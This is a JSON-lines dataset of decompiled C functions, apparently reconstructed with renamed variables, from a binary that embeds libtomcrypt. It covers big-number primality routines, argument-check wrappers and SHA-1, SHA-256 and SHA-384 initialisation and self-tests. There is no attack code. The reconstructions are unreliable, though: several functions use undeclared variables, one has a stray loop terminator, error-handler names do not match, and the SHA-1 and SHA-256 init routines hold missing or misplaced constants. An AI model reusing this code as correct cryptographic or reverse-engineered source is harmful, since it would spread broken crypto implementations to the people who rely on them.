{"Function Name": "FUN_0040f3e0", "Address": "0040f3e0", "Source Code": "ulong FUN_0040f3e0(undefined8 param_1, int *param_2, undefined8 param_3, undefined4 *param_4, int param_5)\n{\n    uint returnValue; \n    ulong returnValue2; \n    ulong loopControl; \n    int valueFromParam2; \n    int initialValue = 2; \n    int calculationValue; \n    uint bitManipulationValue; \n    undefined *localArrayPointer1; \n    undefined *localArrayPointer2; \n    long temporaryLongValue; \n    undefined8 returnValue3; \n    int localValueFromParam2; \n    undefined8 *localArrayPointer; \n    undefined localBuffer1[6128]; \n    undefined localBuffer2[8]; \n    undefined stackBuffer[24]; \n    undefined localBuffer3[24]; \n    undefined4 localValue1; \n    int localValue2; \n    undefined4 localValue3; \n    valueFromParam2 = *param_2; \n    if (valueFromParam2 != 0) { \n        calculationValue = (valueFromParam2 - 1) * 0x3c; \n        for (returnValue2 = *(ulong *)(*(long *)(param_2 + 4) + -8 + (long)valueFromParam2 * 8); returnValue2 != 0; returnValue2 >>= 1) { \n            calculationValue++; \n        }\n        if (calculationValue < 8) { \n            initialValue = 2; \n        } else {\n            initialValue = 3; \n            if (calculationValue > 0x24) { \n                if (calculationValue > 0x8c) { \n                    if (calculationValue > 0x1c2) { \n                        if (calculationValue > 0x517) { \n                            initialValue = (0xdc9 < calculationValue) + 7; \n                        }\n                    } else {\n                        initialValue = 5; \n                    }\n                } else {\n                    initialValue = 4; \n                }\n            }\n        }\n    }\n    \n    returnValue2 = FUN_00406af0(localBuffer1); \n    if ((int)returnValue2 != 0) { \n        return returnValue2; \n    }\n    \n    uint calculatedValue = 1 << ((byte)(initialValue - 1) & 0x1f); \n    bitManipulationValue = 1 << (sbyte)initialValue; \n    \n    if ((int)calculatedValue < (int)bitManipulationValue) { \n        localArrayPointer1 = localBuffer3 + (long)(int)calculatedValue * 0x18; \n        do {\n            returnValue = FUN_00406af0(localArrayPointer1); \n            if (returnValue != 0) { \n                if ((int)calculatedValue < (int)loopControl) { \n                    localArrayPointer1 = localBuffer3 + (long)(int)calculatedValue * 0x18; \n                    do {\n                        localArrayPointer2 = localArrayPointer1 + 0x18; \n                        FUN_004064f0(localArrayPointer1); \n                        localArrayPointer1 = localArrayPointer2; \n                    } while (localArrayPointer2 != localBuffer1 + ((long)(int)calculatedValue + (ulong)(~calculatedValue + loopControl)) * 0x18); \n                }\n                FUN_004064f0(localBuffer1); \n                return (ulong)returnValue; \n            }\n            loopControl++; \n            localArrayPointer1 += 0x18; \n        } while (loopControl != bitManipulationValue); \n    }\n    \n    loopControl = FUN_00406af0(localBuffer2); \n    returnValue2 = (ulong)loopControl; \n    if (loopControl != 0) goto LAB_0040f598; \n    \n    if (param_5 == 0) { \n        loopControl = FUN_0040bbe0(localBuffer2, param_3); \n        returnValue2 = (ulong)loopControl; \n        if (loopControl == 0) { \n            functionPointer = FUN_0040da30; \nLAB_0040f63e:\n            loopControl = FUN_0040b8d0(param_1, param_3, localBuffer1); \n            returnValue2 = (ulong)loopControl; \n            if (loopControl == 0) { \n                localArrayPointer1 = localBuffer3 + (long)(int)calculatedValue * 0x18; \n                loopControl = FUN_00406750(localBuffer1, localArrayPointer1); \n                returnValue2 = (ulong)loopControl; \n                if (loopControl == 0) { \n                    valueFromParam2 = 0; \n                    do {\n                        loopControl = FUN_0040df80(localArrayPointer1); \n                        if ((loopControl != 0) || (loopControl = (*functionPointer)(localArrayPointer1, param_3, localBuffer2), loopControl != 0)) { \n                            returnValue2 = (ulong)loopControl; \n                            goto LAB_0040f611; \n                        }\n                        valueFromParam2++; \n                    } while (valueFromParam2 < initialValue - 1); \n                    valueFromParam2 = calculatedValue + 1; \n                    if (valueFromParam2 < (int)bitManipulationValue) { \n                        localArrayPointer1 = stackBuffer + (long)valueFromParam2 * 0x18; \n                        do {\n                            localArrayPointer2 = localArrayPointer1 + 0x18; \n                            loopControl = FUN_0040cb50(localArrayPointer1, localBuffer1, localArrayPointer2); \n                            if ((loopControl != 0) || (loopControl = (*functionPointer)(localArrayPointer2, param_3, localBuffer2), loopControl != 0)) { \n                                returnValue2 = (ulong)loopControl; \n                                goto LAB_0040f611; \n                            }\n                            localArrayPointer1 = localArrayPointer2; \n                        } while (localArrayPointer2 != localBuffer3 + ((long)valueFromParam2 + (ulong)((bitManipulationValue - 2) - calculatedValue)) * 0x18); \n                    }\n                    loopControl = FUN_00406af0(&localValue1); \n                    returnValue2 = (ulong)loopControl; \n                    if (loopControl == 0) { \n                        temporaryLongValue = 0; \n                        localValue3 = 0; \n                        if (0 < localValue2) { \n                            do {\n                                localArrayPointer[temporaryLongValue] = 0; \n                                temporaryLongValue++; \n                            } while ((int)temporaryLongValue < localValue2); \n                        }\n                        localValueFromParam2 = *param_2; \n                        *localArrayPointer = 1; \n                        valueFromParam2 = 0; \n                        localValue1 = 1; \n                        localValue4 = 1; \n                        loopControl = 0; \n                        localValueFromParam2--; \n                        returnValue3 = 0; \n                        while (true) { \n                            while (true) { \n                                while (true) { \n                                    localValue4--; \n                                    returnValue = (uint)returnValue3; \n                                    if (localValue4 == 0) { \n                                        if (localValueFromParam2 == -1) { \n                                            if ((valueFromParam2 < 1) || (returnValue != 2)) goto LAB_0040f96b; \n                                            initialValue = 0; \n                                            goto LAB_0040f9b4; \n                                        }\n                                        temporaryLongValue = (long)localValueFromParam2; \n                                        localValueFromParam2--; \n                                        localValue4 = 0x3c; \n                                        localValue5 = *(long *)(*(long *)(param_2 + 4) + temporaryLongValue * 8); \n                                    }\n                                    temporaryLongValue = localValue5 << 1; \n                                    uint uVar9 = (uint)((ulong)localValue5 >> 0x3b) & 1; \n                                    localValue5 = temporaryLongValue; \n                                    if ((uVar9 | returnValue) != 0) break; \n                                    returnValue3 = 0; \n                                }\n                                if ((uVar9 == 0) && (returnValue == 1)) break; \n                                valueFromParam2++; \n                                returnValue3 = 2; \n                                loopControl |= uVar9 << ((sbyte)initialValue - (char)valueFromParam2 & 0x1fU); \n                                if (valueFromParam2 == initialValue) { \n                                    valueFromParam2 = 0; \n                                    do {\n                                        returnValue = FUN_0040df80(&localValue1); \n                                        if ((returnValue != 0) || (returnValue = (*functionPointer)(&localValue1, param_3, localBuffer2), returnValue != 0)) goto LAB_0040f8b2; \n                                        valueFromParam2++; \n                                    } while (valueFromParam2 < initialValue); \n                                    returnValue = FUN_0040cb50(&localValue1, localBuffer3 + (long)(int)loopControl * 0x18); \n                                    if (returnValue != 0) goto LAB_0040f8b2; \n                                    returnValue3 = (*functionPointer)(&localValue1, param_3, localBuffer2); \n                                    returnValue = (uint)returnValue3; \n                                    if (returnValue != 0) goto LAB_0040f8b2; \n                                    returnValue3 = CONCAT71((int7)((ulong)returnValue3 >> 8), 1); \n                                    valueFromParam2 = 0; \n                                    loopControl = 0; \n                                }\n                            }\n                            returnValue = FUN_0040df80(&localValue1); \n                            if (returnValue != 0) break; \n                            returnValue3 = (*functionPointer)(&localValue1, param_3, localBuffer2); \n                            returnValue = (uint)returnValue3; \n                            if (returnValue != 0) break; \n                            returnValue3 = CONCAT71((int7)((ulong)returnValue3 >> 8), 1); \n                        }\n                        goto LAB_0040f8b2; \n                    }\n                }\n            }\n        } else {\n            loopControl = FUN_0040b070(param_3, localBuffer2); \n            returnValue2 = (ulong)loopControl; \n            if (loopControl == 0) { \n                functionPointer = FUN_0040dbd0; \n                goto LAB_0040f63e; \n            }\n        }\n    LAB_0040f611:\n        FUN_004064f0(localBuffer2); \n    LAB_0040f598:\n        FUN_004064f0(localBuffer1); \n        if ((int)calculatedValue < (int)bitManipulationValue) { \n            localArrayPointer1 = localBuffer3 + (long)(int)calculatedValue * 0x18; \n            do {\n                localArrayPointer2 = localArrayPointer1 + 0x18; \n                FUN_004064f0(localArrayPointer1); \n                localArrayPointer1 = localArrayPointer2; \n            } while (localArrayPointer2 != localBuffer1 + ((long)(int)calculatedValue + (ulong)((bitManipulationValue - 1) - calculatedValue)) * 0x18); \n        }\n        return returnValue2; \n    }\n}"}
{"Function Name": "FUN_0040fa40", "Address": "0040fa40", "Source Code": "ulong FUN_0040fa40(undefined8 input_param_1, long input_param_2, int *input_param_3, undefined8 input_param_4)\n{\n    uint return_value_1; \n    ulong return_value_2; \n    byte *byte_array_ptr; \n    undefined8 status_value; \n    undefined temp_storage[32]; \n    \n    \n    if (input_param_3[2] == 1) {\n        return 0xfffffffd; \n    }\n    \n    \n    if (*(int *)(input_param_2 + 8) == 1) {\n        return_value_2 = FUN_00406af0(temp_storage); \n        if ((int)return_value_2 != 0) { \n            return return_value_2; \n        }\n        \n        \n        return_value_1 = FUN_0040c6c0(input_param_1, input_param_3, temp_storage);\n        \n        \n        if ((return_value_1 == 0) && (return_value_1 = FUN_00406af0(temp_storage), return_value_1 == 0)) {\n            \n            return_value_1 = FUN_00406750(input_param_2, temp_storage);\n            if (return_value_1 == 0) { \n                return_value_1 = FUN_0040fa40(temp_storage, input_param_3, input_param_4);\n            }\n        }\n        \n        \n        FUN_00406540(temp_storage, temp_storage, 0);\n        return (ulong)return_value_1; \n    }\n    \n    \n    int result_check_1 = FUN_00407df0(input_param_3);\n    status_value = 1; \n    \n    \n    if (result_check_1 == 1) goto LAB_0040faf8;\n    \n    \n    result_check_1 = *input_param_3;\n    \n    int result_check_2 = (result_check_1 < 2) ? FUN_00407d50(input_param_3) * 2 : 1;\n    \n    \n    if (result_check_1 >= 2) {\n        byte_array_ptr = *(byte **)(input_param_3 + 4); \n        long *long_array_ptr = (long *)(byte_array_ptr + 8); \n        do {\n            \n            if (*long_array_ptr != 0xfffffffffffffff) goto LAB_0040fb20;\n            long_array_ptr++; \n        } while (long_array_ptr != (long *)(byte_array_ptr + (ulong)(result_check_1 - 2) * 8 + 0x10)); \n    }\n    \nLAB_0040fb20:\n    byte_array_ptr = *(byte **)(input_param_3 + 4); \n    \n    if ((*byte_array_ptr & 1) != 0) goto LAB_0040fac9;\n    \n    if (result_check_2 == 0) {\n        status_value = 0; \nLAB_0040faf8:\n        \n        return FUN_0040f3e0(input_param_1, input_param_2, input_param_3, input_param_4, status_value);\n    }\n    \nLAB_0040fac9:\n    \n    return FUN_0040e9e0(input_param_1, input_param_2, input_param_3, input_param_4);\n}"}
{"Function Name": "FUN_0040fbe0", "Address": "0040fbe0", "Source Code": "int FUN_0040fbe0(undefined8 input_param, int *array_param, undefined4 *output_param)\n{\n    int result = -3; \n    *output_param = 0; \n    \n    \n    if ((array_param[2] != 1) && ((1 < *array_param || (FUN_00405a00(array_param, 1) == 1)) && \n        (result = FUN_00406af0(stack_buffer), result == 0))) {\n        \n        \n        result = FUN_0040fa40(array_param, input_param, input_param, stack_buffer);\n        \n        \n        if ((result == 0) && (FUN_00406680(stack_buffer, array_param) == 0)) {\n            *output_param = 1; \n        }\n        \n        \n        FUN_004064f0(stack_buffer);\n    }\n    \n    return result; \n}"}
{"Function Name": "FUN_0040fc90", "Address": "0040fc90", "Source Code": "int FUN_0040fc90(undefined8 inputParameter, int *inputArray, undefined4 *outputParameter)\n{\n    int returnValue; \n    int intermediateResult; \n    int operationResult; \n    int loopCounter; \n    int additionalCondition; \n    undefined temporaryDataStack[32]; \n    int intermediateResultsArray[2]; \n    undefined anotherTemporaryDataStack[32]; \n    *outputParameter = 0; \n    \n    if ((inputArray[2] == 1) || ((*inputArray < 2 && (intermediateResult = FUN_00405a00(inputArray, 1), intermediateResult != 1)) || (returnValue = FUN_00406f80(temporaryDataStack, inputParameter), returnValue != 0))) {\n        return -3; \n    }\n    \n    \n    returnValue = FUN_00408b90(temporaryDataStack, 1, temporaryDataStack);\n    if ((returnValue != 0) || (returnValue = FUN_00406f80(anotherTemporaryDataStack, temporaryDataStack), returnValue != 0)) goto LAB_0040fcf6; \n    intermediateResult = FUN_004066c0(anotherTemporaryDataStack); \n    returnValue = FUN_00407f00(anotherTemporaryDataStack, intermediateResult, anotherTemporaryDataStack, 0); \n    if ((returnValue == 0) && (returnValue = FUN_00406af0(intermediateResultsArray), returnValue == 0)) { \n        operationResult = FUN_0040fa40(inputArray, anotherTemporaryDataStack, inputParameter, intermediateResultsArray); \n        if (operationResult == 0) { \n            \n            if ((((intermediateResultsArray[0] > 1) || (loopCounter = FUN_00405a00(intermediateResultsArray, 1), loopCounter != 0)) && (loopCounter = FUN_00406680(intermediateResultsArray, temporaryDataStack), loopCounter != 0))) {\n                loopCounter = 1; \n                if (intermediateResult < 2) goto LAB_0040fe1e; \n                do {\n                    returnValue = FUN_0040f370(intermediateResultsArray, inputParameter); \n                    if ((returnValue != 0) || ((intermediateResultsArray[0] < 2 && (additionalCondition = FUN_00405a00(intermediateResultsArray, 1), additionalCondition == 0)))) goto LAB_0040fe1e; \n                    loopCounter++; \n                    \n                    if (loopCounter == intermediateResult) {\n                        if (FUN_00406680(intermediateResultsArray, temporaryDataStack) != 0) goto LAB_0040fe1e; \n                        break; \n                    }\n                } while (FUN_00406680(intermediateResultsArray, temporaryDataStack) != 0); \n            }\n            *outputParameter = 1; \n            returnValue = operationResult; \n        }\n    }\nLAB_0040fe1e:\n    FUN_004064f0(intermediateResultsArray); \nLAB_0040fcf6:\n    FUN_004064f0(anotherTemporaryDataStack); \n    FUN_004064f0(temporaryDataStack); \n    return returnValue; \n}"}
{"Function Name": "FUN_0040ffd0", "Address": "0040ffd0", "Source Code": "int FUN_0040ffd0(undefined8 input_param, int status_code, uint bit_mask, uint flags, code *callback_function, undefined8 context) {\n    uint modified_flags; \n    uint lower_bits; \n    int return_status;  \n    byte *memory_pointer; \n    int bytes_to_allocate;  \n    byte masking_value; \n    byte additional_mask; \n    int local_values[3]; \n    \n    if ((int)bit_mask < 2 || status_code < 1) {\n        return_status = -3; \n    } else {\n        modified_flags = flags | 1; \n        if ((flags & 2) == 0) {\n            modified_flags = flags; \n        }\n        lower_bits = bit_mask & 7; \n        bytes_to_allocate = ((int)bit_mask >> 3) + (uint)(lower_bits != 0); \n        memory_pointer = (byte *)malloc((long)bytes_to_allocate); \n        if (memory_pointer == (byte *)0x0) {\n            return_status = -2; \n        } else {\n            \n            masking_value = (lower_bits != 0) ? (byte)(0xff >> (8U - (char)lower_bits & 0x1f)) : 0xff;\n            \n            additional_mask = (modified_flags & 8) ? (byte)(0x80 >> (9U - (char)bit_mask & 7)) : 0;\n            do {\n                return_status = (*callback_function)(memory_pointer, bytes_to_allocate, context); \n                if (return_status != bytes_to_allocate) {\n                    return_status = -3; \n                    goto LAB_00410116; \n                }\n                \n                *memory_pointer = masking_value & *memory_pointer | (byte)(1 << ((char)bit_mask - 1U & 7));\n                \n                memory_pointer[lower_bits == 1] |= additional_mask;\n                \n                memory_pointer[(long)bytes_to_allocate - 1] |= (-((modified_flags & 1) == 0) & 0xfeU) + 3;\n                \n                return_status = FUN_00407be0(input_param, memory_pointer, bytes_to_allocate);\n                if (return_status != 0) goto LAB_00410116; \n                \n                return_status = FUN_0040fe70(input_param, status_code, local_values);\n                if (return_status != 0) goto LAB_00410116; \n            } while (local_values[0] == 0); \n            \n            if ((modified_flags & 2) == 0) goto LAB_00410116; \n            \n            return_status = FUN_00408b90(input_param, 1, input_param);\n            if (return_status != 0) goto LAB_00410116; \n            \n            return_status = FUN_00406860(input_param, input_param);\n            if (return_status != 0) goto LAB_00410116; \n            \n            return_status = FUN_0040fe70(input_param, status_code, local_values);\n            if (return_status != 0) goto LAB_00410116; \n        } while (local_values[0] == 0); \n        \n        return_status = FUN_00407400(input_param, input_param);\n        if (return_status == 0) {\n            \n            return_status = FUN_00408dd0(input_param, 1, input_param);\n        }\n    LAB_00410116:\n        free(memory_pointer); \n    }\n    return return_status; \n}"}
{"Function Name": "FUN_004101e0", "Address": "004101e0", "Source Code": "ulong FUN_004101e0(uint *inputArray,int inputParam2,int inputParam3)\n{\n    ulong returnValue; \n    ulong *arrayPointer; \n    uint firstElement; \n    long loopIndex; \n    long tempIndex; \n    undefined8 *dataPointer; \n    int loopCounter; \n    int currentIndex; \n    \n    if (0xff < inputParam2 - 1U) {\n        return 0xfffffffd; \n    }\n    \n    firstElement = *inputArray; \n    inputArray[2] = 0; \n    \n    \n    if (((int)firstElement < 2) && (loopCounter = FUN_00405a00(inputArray, 0x653), loopCounter == -1)) {\n        dataPointer = &DAT_0043edb0; \n        loopCounter = 0xff; \n        \n        \n        do {\n            currentIndex = FUN_00405a00(inputArray, *dataPointer); \n            if (currentIndex != -1) { \n                if (inputParam3 != 1) { \n                    firstElement = inputArray[1]; \n                    loopIndex = 0; \n                    *inputArray = 0; \n                    arrayPointer = *(ulong **)(inputArray + 4); \n                    \n                    \n                    if (0 < (int)firstElement) {\n                        do {\n                            arrayPointer[loopIndex] = 0; \n                            loopIndex++; \n                        } while ((int)loopIndex < (int)firstElement); \n                    }\n                    *arrayPointer = (&dataArray)[loopCounter] & 0xfffffffffffffff; \n                    *inputArray = (uint)((&dataArray)[loopCounter] & 0xfffffffffffffff != 0); \n                    return 0; \n                }\n                currentIndex = loopCounter; \n                if (((uint)dataPointer[1] & 3) != 3) { \n                    while (currentIndex != 0x100) { \n                        returnValue = (&dataArray)[currentIndex]; \n                        if (((uint)returnValue & 3) == 3) { \n                            firstElement = inputArray[1]; \n                            loopIndex = 0; \n                            *inputArray = 0; \n                            arrayPointer = *(ulong **)(inputArray + 4); \n                            \n                            \n                            if (0 < (int)firstElement) {\n                                do {\n                                    arrayPointer[loopIndex] = 0; \n                                    loopIndex++; \n                                } while ((int)loopIndex < (int)firstElement); \n                            }\n                            returnValue = returnValue & 0xfffffffffffffff; \n                            *arrayPointer = returnValue; \n                            *inputArray = (uint)(returnValue != 0); \n                            return 0; \n                        }\n                        currentIndex++; \n                    }\n                }\n            }\n            dataPointer--; \n            loopCounter--; \n        } while (loopCounter != 0); \n        \n        returnValue = FUN_00405a00(inputArray, 1); \n        if ((int)returnValue == 0) { \n            firstElement = inputArray[1]; \n            loopIndex = 0; \n            *inputArray = 0; \n            dataPointer = *(undefined8 **)(inputArray + 4); \n            \n            \n            if (0 < (int)firstElement) {\n                do {\n                    dataPointer[loopIndex] = 0; \n                    loopIndex++; \n                } while ((int)loopIndex < (int)firstElement); \n            }\n            *dataPointer = 2; \n            *inputArray = 1; \n            return returnValue; \n        }\n    }\n    \n    \n    if (inputParam3 == 1) {\n        firstElement = (uint)**(undefined8 **)(inputArray + 4) & 3; \n        if ((firstElement != 3) && (returnValue = FUN_00408b90(inputArray, firstElement + 1, inputArray), (int)returnValue != 0)) {\n            return returnValue; \n        }\n        loopIndex = 4; \n    } else {\n        \n        if (((0 < (int)firstElement) && ((**(byte **)(inputArray + 4) & 1) == 0)) &&\n            (returnValue = FUN_00408b90(inputArray, 1, inputArray), (int)returnValue != 0)) {\n            return returnValue; \n        }\n        loopIndex = 2; \n    }\n    \n    tempIndex = 0; \n    \n    do {\n        returnValue = FUN_00408170(inputArray, *(undefined8 *)((long)&dataEnd + tempIndex), 0, (long)localArray + tempIndex);\n        if ((int)returnValue != 0) {\n            return returnValue; \n        }\n        tempIndex += 8; \n    } while (tempIndex != 0x7f8); \n    \n    returnValue = FUN_00406af0(&localStatus); \n    if ((int)returnValue != 0) {\n        return returnValue; \n    }\n    \n    returnValue = 0; \n    \n    do {\n        arrayPointer = (ulong *)((long)localArray + tempIndex); \n        uVar1 = *(ulong *)((long)&dataEnd + tempIndex); \n        uVar7 = loopIndex + *arrayPointer; \n        *arrayPointer = uVar7; \n        if (uVar1 <= uVar7) { \n            uVar7 = uVar7 - uVar1; \n            *arrayPointer = uVar7; \n        }\n        if (uVar7 == 0) { \n            isZeroFlag = true; \n        }\n        tempIndex += 8; \n    } while (tempIndex != 0x7f8); \n    \n    \n    if (isZeroFlag) {\n        if (0x1000000000000000U - loopIndex <= returnValue) { \n            firstElement = FUN_00408dd0(inputArray, returnValue, inputArray); \n            if (firstElement != 0) {\n                FUN_004064f0(&localStatus); \n                return (ulong)firstElement; \n            }\n        }\n        returnValue = 0; \n    }\n    \n    returnValue += loopIndex; \n    firstElement = FUN_00408dd0(inputArray, returnValue, inputArray); \n    if (firstElement == 0) { \n        arrayPointer = &dataArray; \n        do {\n            tempIndex = 0; \n            returnValue = *arrayPointer; \n            \n            \n            if (0 < bufferSize) {\n                do {\n                    localBuffer[tempIndex] = 0; \n                    tempIndex++; \n                } while ((int)tempIndex < bufferSize); \n            }\n            *localBuffer = returnValue & 0xfffffffffffffff; \n            localStatus = (uint)((returnValue & 0xfffffffffffffff) != 0); \n            firstElement = FUN_0040fc90(inputArray, &localStatus, &localCheck); \n            if (firstElement != 0) {\n                FUN_004064f0(&localStatus); \n                return (ulong)firstElement; \n            }\n            if (localCheck == 0) { \n                break; \n            }\n            arrayPointer++; \n        } while (arrayPointer != &dataEnd + (inputParam2 - 1U)); \n        \n        if (localCheck != 1) { \n            return 0; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00410bc0", "Address": "00410bc0", "Source Code": "void FUN_00410bc0(undefined8 error_message, undefined8 file_name, ulong line_number)\n{\n    \n    fprintf(stderr, \"LTC_ARGCHK \\'%s\\' failure on line %d of file %s\\n\", error_message, (int)(line_number & 0xffffffff), file_name);\n    \n    \n    raise(6);\n}"}
{"Function Name": "FUN_00410ca0", "Address": "00410ca0", "Source Code": "undefined4 FUN_00410ca0(long input_a,long input_b,long input_c,long input_d)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x686f);\n    }\n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x6870);\n    }\n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x6871);\n    }\n    \n    if (input_d == 0) {\n        \n        FUN_00410bc0(\"d != NULL\",\"libtomcrypt.c\",0x6872);\n    }\n    \n    \n    int result = FUN_0040fa40(input_a,input_b,input_c,input_d);\n    \n    \n    if (result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_004111b0", "Address": "004111b0", "Source Code": "undefined4 FUN_004111b0(long input_a,long input_b,long input_c,long input_d)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x6834);\n    }\n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\",\"libtomcrypt.c\",0x6835);\n    }\n    \n    if (input_c == 0) {\n        \n        FUN_00410bc0(\"c != NULL\",\"libtomcrypt.c\",0x6836);\n    }\n    \n    if (input_d == 0) {\n        \n        FUN_00410bc0(\"d != NULL\",\"libtomcrypt.c\",0x6837);\n    }\n    \n    \n    int result = FUN_0040d9c0(input_a,input_b,input_c,input_d);\n    \n    \n    if (result == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00411480", "Address": "00411480", "Source Code": "void FUN_00411480(long input_value, undefined8 input_data, undefined8 *output_pointer)\n{\n    int result_code; \n    int error_type; \n    \n    if (input_value == 0) {\n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6819);\n    }\n    \n    \n    if (output_pointer == (undefined8 *)0x0) {\n        FUN_00410bc0(\"c != NULL\", \"libtomcrypt.c\", 0x681a);\n    }\n    \n    \n    result_code = FUN_00408170(input_value, input_data, 0, output_pointer);\n    \n    \n    if (result_code == 0) {\n        return;\n    }\n    \n    \n    error_type = (result_code == -2) ? 2 : (result_code == -3) ? 1 : 0;\n    \n    \n    if ((&DAT_0043dd34)[(long)error_type * 2] != 0) {\n        return; \n    }\n    \n    return; \n}"}
{"Function Name": "FUN_004115e0", "Address": "004115e0", "Source Code": "undefined4 FUN_004115e0(long input_a, long input_b, undefined8 input_c, undefined8 input_d)\n{\n    \n    if (input_a == 0) {\n        \n        FUN_00410bc0(\"a != NULL\", \"libtomcrypt.c\", 0x6809);\n    }\n    \n    \n    if (input_b == 0) {\n        \n        FUN_00410bc0(\"b != NULL\", \"libtomcrypt.c\", 0x680a);\n    }\n    \n    \n    int result_code = FUN_0040b190(input_a, input_b, input_c, input_d);\n    \n    \n    if (result_code == 0) {\n        \n        return (&DAT_0043dd34)[0];\n    } else if (result_code == -2) {\n        \n        return (&DAT_0043dd34)[2];\n    } else if (result_code == -3) {\n        \n        return 1;\n    }\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_00412330", "Address": "00412330", "Source Code": "int FUN_00412330(void **input_param)\n{\n    void *allocated_memory; \n    long condition_result;   \n    int return_value;    \n    \n    if (input_param == (void **)0x0) {\n        \n        FUN_00410bc0(\"a != NULL\",\"libtomcrypt.c\",0x673e);\n    }\n    \n    \n    allocated_memory = calloc(1, 0x18);\n    *input_param = allocated_memory; \n    \n    if (allocated_memory == (void *)0x0) {\n        return 0xd; \n    }\n    \n    int function_result = FUN_00406af0(allocated_memory);\n    \n    if (function_result == 0) {\n        condition_result = 0; \n    } else if (function_result == -2) {\n        condition_result = 1; \n    } else {\n        condition_result = (function_result == -3) ? 2 : 1; \n    }\n    \n    return_value = (&DAT_0043dd34)[condition_result * 2];\n    \n    if (return_value == 0) {\n        free(*input_param); \n        return 0; \n    }\n    free(*input_param); \n    return return_value; \n}"}
{"Function Name": "FUN_00412410", "Address": "00412410", "Source Code": "undefined8 FUN_00412410(undefined8 input_value, undefined8 *output_pointer)\n{\n    \n    if (output_pointer != NULL) {\n        \n        *output_pointer = 0;\n        \n        return 0;\n    }\n    \n    FUN_00410bc0(\"outlen != NULL\", \"libtomcrypt.c\", 0x731a);\n    \n    return 0;\n}"}
{"Function Name": "FUN_00412450", "Address": "00412450", "Source Code": "undefined8 FUN_00412450(undefined8 *input_pointer)\n{\n    \n    if (input_pointer == (undefined8 *)0x0) {\n        \n        error_handling_function(\"md != NULL\",\"libtomcrypt.c\",0x741b);\n    }\n    \n    *input_pointer = 0;\n    \n    *(undefined4 *)(input_pointer + 1) = 0x67452301;\n    \n    *(undefined4 *)(input_pointer + 2) = 0x98badcfe;\n    \n    *(undefined4 *)(input_pointer + 3) = 0x10325476;\n    \n    *(undefined4 *)(input_pointer + 4) = 0xc3d2e1f0;\n    \n    *(undefined4 *)(input_pointer + 5) = 0;\n    \n    return 0;\n}"}
{"Function Name": "FUN_00412710", "Address": "00412710", "Source Code": "undefined4 FUN_00412710(void) \n{\n    char *data_pointer = &DAT_00438a48; \n    undefined stack_array_32[32]; \n    undefined stack_array_280[280]; \n    do {\n        FUN_00412450(stack_array_280); \n        char *string_pointer = *(char **)(data_pointer - 8); \n        size_t string_length = strlen(string_pointer); \n        FUN_004124b0(stack_array_280, string_pointer, string_length); \n        FUN_004125e0(stack_array_280, stack_array_32); \n        \n        if (memcmp(stack_array_32, data_pointer, 0x14) != 0) { \n            return 5; \n        }\n        data_pointer += 0x20; \n    } while (data_pointer != \"uvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\\\]^_`abcdefghijklmnopq\"); \n    return 0; \n}"}
{"Function Name": "FUN_00412790", "Address": "00412790", "Source Code": "undefined8 FUN_00412790(undefined8 *input_array)\n{\n    \n    if (input_array == (undefined8 *)0x0) {\n        \n        error_handler(\"md != NULL\",\"libtomcrypt.c\",0x7561);\n    }\n    \n    \n    *(undefined4 *)(input_array + 5) = 0;\n    \n    \n    *input_array = 0;\n    \n    \n    *(undefined4 *)(input_array + 1) = 0x6a09e667;\n    \n    \n    *(undefined4 *)(input_array + 2) = 0xbb67ae85;\n    \n    \n    *(undefined4 *)(input_array + 3) = 0x3c6ef372;\n    \n    \n    *(undefined4 *)(input_array + 4) = 0xa54ff53a;\n    \n    \n    *(undefined4 *)(input_array + 6) = 0x510e527f;\n    \n    \n    *(undefined4 *)(input_array + 7) = 0x9b05688c;\n    \n    \n    *(undefined4 *)(input_array + 8) = 0x1f83d9ab;\n    \n    \n    *(undefined4 *)(input_array + 9) = 0x5be0cd19;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00412a60", "Address": "00412a60", "Source Code": "undefined4 FUN_00412a60(void) \n{\n    char *string_pointer; \n    size_t string_length; \n    undefined *data_pointer = &DAT_004389e8; \n    undefined temporary_data[32]; \n    do {\n        FUN_00412790(local_variable); \n        string_pointer = *(char **)(data_pointer + -8); \n        string_length = strlen(string_pointer); \n        FUN_00412800(local_variable, string_pointer, string_length); \n        FUN_00412930(local_variable, temporary_data); \n        if (memcmp(temporary_data, data_pointer, 0x20) != 0) { \n            return 5; \n        }\n        data_pointer += 0x28; \n    } while (data_pointer != &DAT_00438a38); \n    return 0; \n}"}
{"Function Name": "FUN_00412ae0", "Address": "00412ae0", "Source Code": "undefined8 FUN_00412ae0(undefined8 *input_array)\n{\n    \n    if (input_array == (undefined8 *)0x0) {\n        \n        FUN_00410bc0(\"md != NULL\",\"libtomcrypt.c\",0x7610);\n    }\n    \n    \n    *input_array = 0;\n    \n    \n    input_array[1] = 0xcbbb9d5dc1059ed8;\n    \n    \n    input_array[2] = 0x629a292a367cd507;\n    \n    \n    input_array[3] = 0x9159015a3070dd17;\n    \n    \n    input_array[4] = 0x152fecd8f70e5939;\n    \n    \n    input_array[5] = 0x67332667ffc00b31;\n    \n    \n    input_array[6] = 0x8eb44a8768581511;\n    \n    \n    input_array[7] = 0xdb0c2e0d64f98fa7;\n    \n    \n    input_array[8] = 0x47b5481dbefa4fa4;\n    \n    \n    input_array[9] = 0;\n    \n    \n    return 0;\n}"}
